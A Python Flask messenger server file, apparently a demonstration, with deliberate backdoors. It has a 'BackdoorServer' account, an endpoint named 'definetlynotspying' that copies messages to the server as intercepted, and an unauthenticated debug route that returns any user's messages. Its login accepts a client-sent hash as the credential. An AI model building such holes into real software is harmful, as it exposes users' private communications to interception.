# server.py with SQLite and hashed password support
from crypt import methods

from flask import Flask, request, jsonify
from cryptography.hazmat.primitives import serialization
import base64
import sqlite3
import os
import hashlib
from cryptography.hazmat.primitives.asymmetric import rsa

app = Flask(__name__)
DB_FILE = 'messenger.db'

# === Initialize SQLite ===
def init_db():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS users (
                    user_id TEXT PRIMARY KEY,
                    username TEXT UNIQUE,
                    public_key TEXT,
                    password_hash TEXT
                )''')
    c.execute('''CREATE TABLE IF NOT EXISTS messages (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    recipient_id TEXT,
                    sender TEXT,
                    message TEXT
                )''')
    conn.commit()
    conn.close()

init_db()

# === Server Key ===
server_private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
server_public_key = server_private_key.public_key()
server_user_id = "server"

def store_server_key():
    pubkey_pem = base64.b64encode(
        server_public_key.public_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PublicFormat.SubjectPublicKeyInfo
        )
    ).decode()
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("INSERT OR IGNORE INTO users (user_id, username, public_key, password_hash) VALUES (?, ?, ?, ?)",
              (server_user_id, 'BackdoorServer', pubkey_pem, ''))
    conn.commit()
    conn.close()

store_server_key()

# === Routes ===
@app.route('/api/register', methods=['POST'])
def register():
    data = request.get_json()
    username = data.get("username")
    public_key = data.get("public_key")
    password_hash = data.get("password_hash")
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT user_id FROM users WHERE username = ?", (username,))
    if c.fetchone():
        conn.close()
        return jsonify({"error": "Username already taken"}), 400

    user_id = f"user_{username}"
    c.execute("INSERT INTO users (user_id, username, public_key, password_hash) VALUES (?, ?, ?, ?)",
              (user_id, username, public_key, password_hash))
    conn.commit()
    conn.close()
    return jsonify({"user_id": user_id})

@app.route('/api/login', methods=['POST'])
def login():
    data = request.get_json()
    username = data.get("username")
    password_hash = data.get("password_hash")
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT user_id FROM users WHERE username = ? AND password_hash = ?", (username, password_hash))
    row = c.fetchone()
    conn.close()
    if row:
        return jsonify({"user_id": row[0]})
    return jsonify({"error": "Invalid credentials"}), 401

@app.route('/api/publickey', methods=['GET'])
def public_key():
    user_id = request.args.get("user")
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT public_key FROM users WHERE user_id = ?", (user_id,))
    row = c.fetchone()
    conn.close()
    if row:
        return row[0]
    return "Not found", 404

@app.route('/api/sendMessage', methods=['POST'])
def send_message():
    user_id = request.args.get("user")
    data = request.get_json()
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("INSERT INTO messages (recipient_id, sender, message) VALUES (?, ?, ?)",
              (user_id, 'client', data.get("message")))
    conn.commit()
    conn.close()
    return jsonify({"status": "Message received"})

@app.route('/api/definetlynotspying', methods=['POST'])
def backdoor():
    user_id = request.args.get("user")
    data = request.get_json()
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("INSERT INTO messages (recipient_id, sender, message) VALUES (?, ?, ?)",
              (server_user_id, '[intercepted]', data.get("message")))
    conn.commit()
    conn.close()
    return jsonify({"status": "👀 Message copied to server"})

@app.route('/api/debug/messages/<user_id>')
def get_messages(user_id):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT sender, message FROM messages WHERE recipient_id = ?", (user_id,))
    rows = c.fetchall()
    conn.close()
    return jsonify([{"from": row[0], "message": row[1]} for row in rows])

if __name__ == '__main__':
    app.run(port=6556)
